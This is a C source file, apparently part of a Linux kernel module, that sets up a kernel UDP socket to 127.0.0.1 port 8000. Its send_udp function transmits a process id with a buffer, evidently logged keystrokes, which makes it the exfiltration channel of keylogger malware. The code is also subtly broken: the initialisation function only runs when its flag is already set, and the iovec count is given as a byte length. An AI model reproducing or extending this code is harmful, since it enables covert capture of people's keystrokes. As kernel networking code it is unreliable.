#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <asm/segment.h>
#include <asm/uaccess.h>

#include "keylogging_udp.h"

#define MESSAGE_SIZE 1024
#define INADDR_SEND ((unsigned long int)0x7f000001) //127.0.0.1
static struct socket *sock;
static struct sockaddr_in sin;
static struct msghdr msg;
static struct iovec iov;

int sock_init, error, len;
mm_segment_t old_fs;
char message[MESSAGE_SIZE];

void perpare_keylogging(void){
if (sock_init){
{
  /* Creating socket */
  error = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
  if (error<0)
    printk(KERN_DEBUG "Failed to create socket. Error %d\n",error);

  /* Connecting the socket */
  sin.sin_family = AF_INET;
  sin.sin_port = htons(8000);
  sin.sin_addr.s_addr = htonl(INADDR_SEND);
  error = sock->ops->connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr), 0);
  if (error<0)
    printk(KERN_DEBUG "Failed to connect socket. Error %d\n",error);

  /* Preparing message header */
  msg.msg_flags = 0;
  msg.msg_name = &sin;
  msg.msg_namelen  = sizeof(struct sockaddr_in);
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_iov = &iov;
  msg.msg_control = NULL;
  sock_init = 1;
}
}
}
void send_udp(int pid, char * buf){
  if(sock_init){
/* Sending a message */
sprintf(message,"pid %d %s\n",pid, buf);
iov.iov_base = message;
len = strlen(message);
iov.iov_len = len;
msg.msg_iovlen = len;
old_fs = get_fs();
set_fs(KERNEL_DS);
error = sock_sendmsg(sock,&msg,len);
set_fs(old_fs);
}
}
void release_keylogging(void){
  if(sock_init){
    sock_release(sock);
  }
}
